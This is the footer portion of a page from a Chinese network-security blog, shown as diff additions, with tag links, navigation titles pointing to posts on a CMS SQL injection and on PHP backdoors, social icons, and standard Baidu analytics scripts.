+          <a href="https://lcx.cc/tags/%E6%9C%AC%E5%9C%B0/">本地</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E5%91%BD%E4%BB%A4/">命令</a>
+          <a href="https://lcx.cc/tags/%E6%9D%83%E9%99%90/">权限</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E8%BF%9C%E7%A8%8B/">远程</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2751/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">ZYCHCMS企业网站管理系统SQL注入漏洞及后台拿webshell</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/2749/">
+            <span class="next-text nav-default">关于php后门的编写</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
